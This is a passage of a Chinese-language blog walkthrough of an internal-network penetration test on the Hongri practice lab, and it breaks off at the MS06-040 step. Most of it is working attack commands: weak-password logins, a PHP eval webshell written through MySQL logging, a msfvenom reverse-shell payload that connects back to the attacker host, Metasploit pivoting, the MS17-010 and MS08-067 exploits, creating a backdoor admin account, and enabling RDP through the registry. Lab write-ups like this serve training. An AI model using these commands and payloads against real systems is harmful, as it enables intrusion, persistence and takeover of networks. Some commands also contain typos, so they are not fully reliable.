    <content><![CDATA[<h1 id="红日靶场内网渗透"><a href="#红日靶场内网渗透" class="headerlink" title="红日靶场内网渗透"></a>红日靶场内网渗透</h1><h2 id="渗透环境"><a href="#渗透环境" class="headerlink" title="渗透环境"></a>渗透环境</h2><p>外网攻击主机:  kali         </p>
<p>172.16.243.128</p>
<p>内网中的web服务器:   win7      </p>
<p>公网ip:   172.16.243.130</p>
<p> 私网ip:   192.168.52.140</p>
<p>​      </p>
<p>内网中的域成员主机:   win2003</p>
<p>  192.168.52.141</p>
<p>内网中的域控主机:     win2008</p>
<p>  192.168.52.138</p>
<p>kali作为攻击主机，win7作为web服务器防止两个网卡，能连接内网，web服务被外网所访问</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>首先确定攻击网卡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -I</span><br><span class="line">或者 ifconfig </span><br></pre></td></tr></table></figure>

<p>可以看到下面的kali的两个网卡，这里使用的是eth0网卡</p>




<p>使用arp-scan对主机使用网卡的局域网内的主机进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -interface=eth0 --localnet</span><br></pre></td></tr></table></figure>

<p>可以看到eth0局域网中的存活主机，这里可以看到内网中开放的web服务器主机为172.16.243.130</p>




<p>下面对目标web服务器进行信息收集，比如端口，操作系统等信息</p>
<p>使用nmap进行端口扫描和目标系统探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namp -sV -A 172.16.243.130</span><br><span class="line">-sV   扫描目标主机运行软件的版本</span><br><span class="line">-A    扫描目标主机的操作系统和版本检测，脚本扫描和路由跟踪等</span><br></pre></td></tr></table></figure>

<p>可以看到扫描出来的结果，目标主机开放80和3306端口,目标主机开放的两个端口都有可利用价值，对于3306端口的mysql服务，我们可以尝试暴力破解其用户名和密码</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805201824989.png" alt="image-20210805201824989"></p>
<p>访问目标主机的web服务,可以看到目标服务器phpstudy的web探针和php版本信息</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805202527075.png" alt="image-20210805202527075"></p>
<p>对于web探针页面，我们可以看到很多信息，服务器系统版本，web中间件的版本，主机名，管理员邮箱和web绝对根目录等敏感信息</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805202702697.png" alt="image-20210805202702697"></p>
<p>使用dirsearch和dirmap等工具对服务器进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u &quot;http://172.16.243.130&quot; -e</span><br></pre></td></tr></table></figure>





<p>服务器目录如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin     ##mysql数据库管理工具</span><br><span class="line"></span><br><span class="line">phpinfo.php     ##php版本信息</span><br><span class="line"></span><br><span class="line">1.php               </span><br><span class="line"></span><br><span class="line">beifen.rar</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="拿取目标主机shell权限"><a href="#拿取目标主机shell权限" class="headerlink" title="拿取目标主机shell权限"></a>拿取目标主机shell权限</h3><p>1.由于目标服务器存在phpmyadmin，我们访问该数据库管理后台，尝试弱口令，暴力破解等</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805210542586.png" alt="image-20210805210542586"></p>
<p>这里使用弱口令root  root登录了后台</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805210815913.png" alt="image-20210805210815913"></p>
<p>可以看到目标服务器中的数据库列表如下，值得注意的是mysql数据库中的user数据表和newyxcms数据库(这个可能是旁站cms的数据库)</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111233382.png" class title="image-20210806111233382">







<p>进入后台我们想拿到服务器shell权限，由于在之前信息收集中知道了绝对路径，所以尝试使用sql语句写入一句话木马，然后使用工具连接，拿到服务器shell权限</p>
<p>在SQL窗口执行写入一句话木马SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]);?&gt;&#x27; into outfile &#x27;C:/phpstudy/www/cmd.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>但提示由于设置了secure_file_priv选项限制了文件的写入</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805211802360.png" alt="image-20210805211802360"></p>
<p>我们来看看secure_file_priv这个参数的设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure>

<p>可以看到该参数设置为NULL，表示限制啦mysql不允许导入导出，写入文件</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805213119488.png" alt="image-20210805213119488"></p>
<p>我们换个思路，对于数据库的日志记录，尝试修改日志文件为php后缀指定文件，然后将一句话木马写入该日志记录文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;      ##开启日志记录</span><br><span class="line">set global general_log_file=&#x27;C:/phpstudy/WWW/eval.php&#x27;;      ##指定日志记录文件位置为根目录下</span><br><span class="line">select &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]); ?&gt;&#x27;;                    ##输入查询一句话语句，日志记录开启记录在指定文件中</span><br></pre></td></tr></table></figure>



<p>访问172.16.243.130&#x2F;eval.php,可以看到写入eval.php成功</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805215930898.png" alt="image-20210805215930898"></p>
<p>2.在之前对目标网站的目录进行扫描时，发现个压缩包叫做beifen.rar，下载后解压发现为yxcms文件夹，判断目标网站存在旁站，目标服务器部署了一个网站</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111905032.png" class title="image-20210806111905032">



<p>在网上搜索了一下，发现yxcms是一个企业化的建站系统,YXcms是一款基于PHP+MySql开发的网站管理系统，采用轻量级[MVC设计模式]。</p>
<p>其默认的后台页面为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://域名或ip/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>



<p>构造url访问该网站页面:<a href="http://172.16.243.130/yscms">http://172.16.243.130/yscms</a></p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113506787.png" class title="image-20210806113506787">



<p>浏览了一下主页面，出来有个cms后台登录页面看起来有点意思，其余的没什么好东西，于是点击登录，尝试弱口令登录后台</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113733048.png" class title="image-20210806113733048">



<p>结果显示登录失败</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113851326.png" class title="image-20210806113851326">



<p>我看了看url中的r参数为member，是否通过r参数来判断一般用户和管理员登录权限，于是将r修改成admin尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.243.130/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>

<p>可以看到yxcms的管理后台，尝试使用弱口令admin 123456进行登录</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806114049007.png" class title="image-20210806114049007">



<p>成功登录后台页面，可以看到很多服务器相关信息和yxcms网站相关设置和功能</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806115148987.png" class title="image-20210806115148987">



<p>在全局设置中的前台模板中，我们可以修改模板文件，我们可以将木马代码插入其中并进行加载</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806141921572.png" class title="image-20210806141921572">





<p>通过上述的一些方法将一句话木马上传到目标web服务器中，然后使用webshell工具去连接目标路径的木马，拿到web服务器的shell和权限</p>
<p>使用weevely生成木马文件test.php,并将其上传到目标web服务器上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate password(密码)  test.php(生成文件名)</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144420340.png" class title="image-20210806144420340">



<p>然后去连接服务器上的test.php文件，连接建立会话成功</p>
<p>weevely  <a href="http://172.16.243.130/test.php(%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84)">http://172.16.243.130/test.php(文件路径)</a>  password(密码)</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144559145.png" class title="image-20210806144559145">



<p>接下来我们在攻击主机上利用msfvenom生成反弹shell的木马qq.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.243.128 lport=12345 -f exe &gt; qq.exe</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806151838583.png" class title="image-20210806151838583">



<p>然后我们将qq.exe通过weevely上传到目标服务器目录中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_upload /opt/tools/web/auto/metasploit/qq.exe qq.exe</span><br></pre></td></tr></table></figure>



<p>运行该木马程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_sh qq.exe</span><br></pre></td></tr></table></figure>



<p>接着打开msfconsole，开启监听模块设置参数反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole         ###打开metasploit</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler   ###设置监听模块</span><br><span class="line"></span><br><span class="line">set lhost 172.16.243.1      ##设置监听主机ip地址</span><br><span class="line"> </span><br><span class="line">set lport 12345              ###设置监听主机端口</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806153849245.png" class title="image-20210806153849245">



<p>可以看到反弹shell成功，通道建立成功</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806200708273.png" class title="image-20210806200708273">



<h3 id="目标主机信息收集"><a href="#目标主机信息收集" class="headerlink" title="目标主机信息收集"></a>目标主机信息收集</h3><p>后渗透阶段先不急着立马提权或者进行横向渗透，先对目标主机以及所在环境进行全方位的信息收集</p>
<p>主机信息收集的常用cmd命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo                  #查看详细的系统信息</span><br><span class="line">whoami                      #查看当前使用用户</span><br><span class="line">hostname                    #主机名称</span><br><span class="line">net user                    #查看主机上的用户</span><br><span class="line">net localgroup administrators     #查看系统管理员组中的用户列表</span><br><span class="line">ipconfig /all              #查看主机网络配置情况</span><br><span class="line">net share                  #查看本地开启的共享的文件夹</span><br><span class="line">netstat -ano | findstr &quot;端口号&quot;   #查看指定端口的开放情况</span><br><span class="line">wmic product  get name,version   #查询已安装的软件名称及版本情况</span><br><span class="line">cmdkey  /list              #查看3389远程端口可信任链接</span><br><span class="line">FOR /f &quot;skip=1 token=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;) do dir /a /b C:\$Recycle.Bin\%d\ ^&gt;%c.txt  #windows回收站的信息获取</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用systeminfo查看目标主机的系统信息</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203335970.png" class title="image-20210806203335970">



<p>可以看到主机的安装的修补程序，这也是需要着重观察的信息，我们可以通过该修补程序中没有的补丁来查看主机漏洞进行攻击</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203504328.png" class title="image-20210806203504328">



<p>可以看到拿到目标主机的权限是管理员权限</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806204341557.png" class title="image-20210806204341557">



<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>常用的域信息收集命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view /domain          #查看域</span><br><span class="line">net group /domain         #查询组</span><br><span class="line">net user  /domain         #查询域用户</span><br><span class="line">net group  &quot;domain admin&quot;  /domain     #查询域管理员信息</span><br><span class="line">net group  &quot;domain computers&quot;  /domain   #查询域内机器信息</span><br><span class="line">net config workstation        #查看当前计算机名，全名，用户名等信息</span><br><span class="line">net time  /domain             #查询主域服务器的时间</span><br></pre></td></tr></table></figure>

<p>上述的命令会发送到域控中查询信息，如果渗透的机器不是与用户则不是域用户权限，但是存在域</p>
<p>下面为当前计算机的相关信息，可以看到指定的域dns名称为god.org</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211120373.png" class title="image-20210806211120373">





<p>一般来说，域主机的DNS服务器指定的是域控的ip地址，我们可以使用nslookup来观察dns服务器ip地址和解析god.org的A记录ip地址。可以看到ip地址都为192.168.52.138,则可以判断域控为它</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211603738.png" class title="image-20210806211603738">



<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>这里由于反弹shell后连接的目标主机权限为管理员权限，也就省去了提权的操作。收集完目标主机的相关信息后，下面就是对处于内网的主机进行横向渗透，先对域内的主机进行渗透，然后在对域控进行渗透</p>
<h4 id="路由-x2F-端口转发"><a href="#路由-x2F-端口转发" class="headerlink" title="路由&#x2F;端口转发"></a>路由&#x2F;端口转发</h4><p>要想在处于外网的攻击主机连接处于内网域中的主机，肯定是不能直接连接的，要通过受控主机进行端口转发或者路由转发，使受控主机充当个路由转发使外网的主机能连接处于内网的主机</p>
<p><strong>1.直接利用msf添加到内网网段的路由</strong></p>
<p>msf路由相关命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run get_local_subnets            #查看本机的路由</span><br><span class="line">run autoroute  -s  192.168.52.0/24  #添加目标内网网段到路由信息中</span><br><span class="line">run autoroute  -p               #查看当前的路由设置</span><br></pre></td></tr></table></figure>

<p>可以看到当前的路由设置为到内网网段，现在就可以通过msf访问内网主机</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806212949813.png" class title="image-20210806212949813">



<p><strong>2.将内网穿透工具上传到web服务器上，然后在攻击机上进行连接指定端口</strong></p>
<p>这里使用venom工具进行内网穿透，将agent.exe使用upload命令上传到目标web服务器上，然后在攻击机上运行admin客户端程序</p>
<p>这里使用反向代理，客户端监听4444端口，让服务端来连接客户端(admin和agent都可以进行监听和连接)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 4444</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808182501466.png" class title="image-20210808182501466">



<p>在目标主机上运行agent.exe指定admin的ip地址和端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">agent.exe -rhost 172.16.243.1  -rport 4444</span><br></pre></td></tr></table></figure>





<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h4><p>下面就是对目标内网进行信息收集</p>
<p>探测内网中的存活主机，有那些域主机和域控主机</p>
<p>这里使用的是metasploit的auxiliary&#x2F;scanner&#x2F;portscan模块进行端口信息的收集，在之前的信息收集中可以发现域内出来138这台域控外还有一台域内主机，我们首先对这台域内主机进行渗透</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auiliary/scanner/portscan</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>可以看到该台域内主机的端口开放如下:</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808214717299.png" class title="image-20210808214717299">



<p>对域控主机182.168.52.138进行端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auiliary/scanner/portscan</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810112439456.png" class title="image-20210810112439456">





<h4 id="域内主机渗透"><a href="#域内主机渗透" class="headerlink" title="域内主机渗透"></a>域内主机渗透</h4><h4 id="漏洞检测利用"><a href="#漏洞检测利用" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>目标端口的139和445端口开放，联想到ms17-010这个漏洞，尝试去验证这个漏洞是否存在</p>
<p>首先使用nmap自带的脚本进行漏洞Fuzz：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln  192.168.52.141</span><br></pre></td></tr></table></figure>

<p>这里的nmap扫描并没有成功</p>
<p>尝试使用&#x2F;scanner&#x2F;smb&#x2F;ms17_010_commmand模块对目标进行扫描,发现目标可能存在ms17_010</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17has</span><br><span class="line">set rhosts 192.168.52.141</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808220259617.png" class title="image-20210808220259617">



<p>下面使用admin&#x2F;smb&#x2F;ms17_010_command模块对该主机的ms17_010判断是否为可以利用和执行的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure>

<p>可以看到目标主机执行的权限为Administrator管理员权限</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808221620326.png" class title="image-20210808221620326">



<p>接下来就是对目标主机的ms17-010进行漏洞利用拿到目标shell</p>
<p>我首先使用的是exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternablue模块的windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp的payload，但是管道并没有创建成功，由于目标内网不能连接攻击主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_enternablue</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104223573.png" class title="image-20210809104223573">



<p>接着使用了windows&#x2F;smb&#x2F;ms17_010_pspexec模块的windows&#x2F;shell&#x2F;bind_tcp的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">set payload windows/shell/bind_tcp</span><br></pre></td></tr></table></figure>



<p>这个payload可以让目标主机开通个tcp监视器，然后让攻击主机去连接目标主机端口就可以执行shell</p>
<p>攻击成功，进入win2003的shell</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104415099.png" class title="image-20210809104415099">



<p>获取目标主机权限后，首先查看权限级别是否为管理员权限，然后考虑提权的问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p>可以看到此时执行的权限为system，系统管理员权限</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104902785.png" class title="image-20210809104902785">



<p>查看目标主机的系统相关信息，特别是补丁等信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172615660.png" class title="image-20210809172615660">

<p>由于此时的荷载直接就进入cmd窗口并不能使用工具，而且该权限为管理员权限，有两条思路:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.添加新用户将其放入管理员用户组中以管理员的权限执行(添加用户原因是因为我们不知道管理员的密码无法登录)，然后开通3389(远程桌面)、22(ssh端口)等端口，通过连接前面的端口服务将生成的后台木马传入目标主机，然后使用msf等待上线。使用mimikatz、hashdump等来读内存和注册表中的密码，因为域内该主机的系统是Winserver 2008,默认存储明文密码，不需要进行sha1解密等</span><br><span class="line"></span><br><span class="line">2.寻找其他攻击载荷，直接通过msf拿到session</span><br></pre></td></tr></table></figure>



<p><strong>1.添加管理员组新用户，开通敏感服务连接上传木马</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net   user    haoyun        Yzt096877     /add                            ###添加haoyun用户</span><br><span class="line">           </span><br><span class="line">net   user   localgroup   administrators     haoyun     /add              ###添加haoyun到管理员用户组中</span><br></pre></td></tr></table></figure>



<p>开启3389远程桌面服务，要在cmd窗口开启3389端口通过修改注册表和使用内网穿透工具netsh等</p>
<p>由于这里没有办法上传netsh，只能通过在cmd修改注册表开启远程桌面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;              ###查询注册表键值</span><br><span class="line"></span><br><span class="line">reg delete &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections     ###删除注册表键值</span><br><span class="line"></span><br><span class="line">reg add     &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d   ###添加注册表键值修改FdenyTSConnections键值</span><br></pre></td></tr></table></figure>

<p>这是原来的注册表中的fDenyTSConnections 为0x1(十六进制)，当该值为1时，表示3389服务没有开启</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809142515031.png" class title="image-20210809142515031">



<p>修改目标键值后，该键值为0，如下图:</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143417396.png" class title="image-20210809143417396">

<p>可以看到3389端口开启</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143459976.png" class title="image-20210809143459976">





<p>连接远程桌面有两种方式:</p>
<p>1.返回到msf中使用rdesktop命令连接目标主机的3389端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop   -a  16 -r disk:share=/root/shell  192.168.52.141   -u haoyun   -p  Yzt096877</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop相关命令参数:</span><br><span class="line">-f 全屏</span><br><span class="line">-a 16位色</span><br><span class="line">-u xxxxxx 登录用户，可选</span><br><span class="line">-p xxxxxx 登录密码，可选</span><br><span class="line">-r clipboard:PRIMARYCLIPBOARD 重要，剪贴板可以与远程桌面交互</span><br><span class="line">-a 16 颜色，可选，不过最高就是16位</span><br><span class="line">-z 压缩，可选</span><br><span class="line">-g 1024x768 分辨率，可选，缺省是一种比当前本地桌面低的分辨率</span><br><span class="line">-P 缓冲，可选</span><br><span class="line">-r disk:wj=/home/magicgod 映射虚拟盘，可选，会在远程机器的网上邻居里虚拟出一个映射盘，功能很强，甚至可以是软盘或光盘</span><br><span class="line">-r sound:off 关闭声音，当然也可以把远程发的声音映射到本地来。</span><br></pre></td></tr></table></figure>



<p>2.通过venom工具开启个代理，使用proxychains配置代理连接</p>
<p>venom连接成功后，开启代理9999端口</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155333106.png" class title="image-20210809155333106">



<p>然后配置proxychains配置文件，设置代理ip和端口为127.0.0.1 999</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim   /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line">在配置文件最后一行修改为自己的代理端口</span><br><span class="line">socks5  127.0.0.1  9999         </span><br></pre></td></tr></table></figure>



<p>然后使用rdesktop连接内网远程桌面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains   rdesktop  192.168.52.141  -r disk:share=/root/shell</span><br></pre></td></tr></table></figure>

<p>输入账号密码后，连接成功</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155853825.png" class title="image-20210809155853825">



<p>将msfvenom生成的木马通过远程桌面传入目标主机</p>
<p>这里使用上面的反弹shell连接失败，没有返回通道(因为内网主机无法通过跳板机来连接攻击主机，而只有攻击主机才能去连接内网主机，所以反向shell不能使用)。所以使用正向连接荷载生成木马bind.exe，将其上传到win2003上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp   ARCH=x86   PLATFROM=WIN Rhost=192.168.52.141 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure>



<p>在msf上使用exploit&#x2F;multi&#x2F;handler模块的正向payload  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.141</span><br></pre></td></tr></table></figure>

<p>连接成功，管道打开</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809171049187.png" class title="image-20210809171049187">



<p><strong>2.使用相关荷载攻击</strong></p>
<p>通过在漏洞库中搜索win2003相关的漏洞</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172910901.png" class title="image-20210809172910901">



<p>这里尝试ms08-067和ms06_040进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta</span><br></pre></td></tr></table></figure>



<p><strong>2.1 ms08-067漏洞利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms08-067          ###搜索相关模块</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/bind_tcp    ###使用正向shell荷载</span><br><span class="line"></span><br><span class="line">set rhost 192.168.52.1141           ###设置目标主机Ip地址</span><br></pre></td></tr></table></figure>

<p>攻击成功，管道打开</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809173703941.png" class title="image-20210809173703941">



<p><strong>2.2 ms06-040漏洞利用</strong></p>
